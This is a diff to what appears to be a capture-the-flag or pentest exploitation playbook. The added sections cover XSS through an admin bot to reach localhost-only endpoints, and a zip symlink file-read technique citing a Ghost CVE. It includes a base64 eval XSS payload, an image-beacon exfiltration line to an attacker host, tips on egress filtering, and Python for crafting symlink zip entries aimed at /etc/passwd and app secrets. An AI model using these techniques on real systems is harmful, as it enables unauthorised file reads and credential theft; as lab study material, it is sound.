@@ -596,6 +596,49 @@ has an admin-bot that visits URLs you supply.
 credential/cookie theft or an authed-action primitive, not just an alert box.
 Chain it to reach an admin-only route.
 
+**The admin bot runs ON the host, so its browser is your `127.0.0.1`.** The
+highest-value use of an admin-visited XSS is not cookie theft — it is reaching an
+endpoint that authorises on *source IP*. A handler gated on
+`REMOTE_ADDR == '127.0.0.1'` (an internal LFI/API/debug route) returns nothing to
+you but fires for the admin's browser, because that browser is local. So: find
+the endpoint that answers ~empty to a direct request (a 1-byte body regardless of
+params is the tell), then have the XSS `fetch()` it and exfiltrate the response. A
+localhost IP check is not an authorisation boundary once you can drive a local
+browser. Aim the read at what the *web user* (www-data) can reach — `.htpasswd`,
+app config, Apache/nginx vhost confs, `/etc/passwd` — not a user's `~/.ssh` or
+`user.txt`, which that account cannot read.
+
+**Check *every* output sink for the injected field, not just the obvious one.** An app
+can escape a value in one view and interpolate it raw in another: message *content* escaped
+in the user's own chat, but the sender *username* rendered through `innerHTML` unescaped in
+the moderator's review view. If the field you control renders safely where you can see it,
+find the privileged/other view that renders it — register the payload *as the username*, not
+in the message body. Read the client template for each place the value lands.
+
+Three practical traps around the delivery, all of which read as "the XSS didn't
+fire" when they are something else:
+
+- **The payload's own reflection context can break it.** When your injected value is later
+  re-fetched through a URL (the moderator view calls `get_user_messages?username=<payload>`),
+  spaces, `#`, `&`, `+` in the payload corrupt that request so it never renders — the XSS
+  looks dead but was never delivered. Keep the payload **space-free**: `<img src=x
+  onerror=eval(atob('<base64-of-JS>'))>` survives a query-param round-trip where
+  `onerror='var x = …'` (spaces, quotes) does not. Confirm execution separately from
+  exfil — fire an unconditional canary (`new Image().src='http://you/RUN'`) as the first
+  statement; if the canary lands but the data beacon doesn't, the bug is in your JS, not the
+  delivery or egress.
+- **Test exfil egress *direction* on a common port first.** The target reaching
+  *out* to your listener can be port-filtered: callbacks to an arbitrary high port
+  (`:8000`) may get zero hits while the identical payload to `:80`/`:443` lands
+  immediately. Put the beacon on a common port, and keep one unconditional beacon
+  in the payload so a hit proves JS-exec+egress independently of whether the LFI
+  returned anything.
+- **A hosted-upload cleaner races the bot.** If the XSS lives in an uploaded file
+  (a rendered-markdown share link, etc.) that a cron deletes after ~a minute, the
+  link can already be dead when the bot visits ("invalid file", no XSS).
+  Upload-and-deliver in a tight loop so a fresh copy is always present when the
+  bot next polls, rather than delivering once and waiting.
+
 ## An upload that EXTRACTS an archive server-side — read the destination before reaching for a shell
 
 An upload that takes an *archive* (accepts several of zip/7z/rar and says
@@ -624,6 +667,32 @@ intended:
   reach you at all (a prior capture from any host proves the VPN path) before
   assuming your trigger is wrong — a dormant review task is a machine-state issue,
   not an exploit bug.
+
+## An upload that stores an archived SYMLINK — arbitrary file read, not RCE
+
+A different archive-upload class: the app unpacks your archive and later *serves*
+or *reads back* the extracted entries (an image library, an import that becomes
+content). If it preserves symlinks, pack a symlink pointing at an absolute host
+path and then request the stored entry — the response is the link's **target**.
+This is a read primitive (as the app user), the delivery is self-contained (no
+callback — promote it when egress is blocked), and it chains straight into config
+files holding downstream creds.
+
+The method, version-agnostic:
+
+1. Pin the product/version; check whether its archive/import path follows
+   symlinks (CVEs of this exact shape exist across CMSes — e.g. Ghost < 5.59.1,
+   CVE-2023-40028, via the admin content-import `db` endpoint).
+2. **Your zip library probably dereferences symlinks when adding files** — the
+   single most common reason a public PoC "uploads a symlink" but reads nothing.
+   In Python, do *not* `zipf.write(symlinkpath)`; synthesise the entry so it *is*
+   a symlink: `zi = ZipInfo('dir/name'); zi.external_attr = 0o120777 << 16` (the
+   `S_IFLNK` mode bits) and `z.writestr(zi, '/etc/passwd')` — the body is the
+   target path. Verify with `unzip -l`/`zipinfo` that the entry shows as `l…`.
+3. Upload, then fetch the stored entry's served URL; iterate targets
+   (`/etc/passwd` to confirm, then the app's own `config.*`/secrets).
+
+Validate the primitive on a known file before trusting an empty read as "patched".
 
 ## After exploitation
 
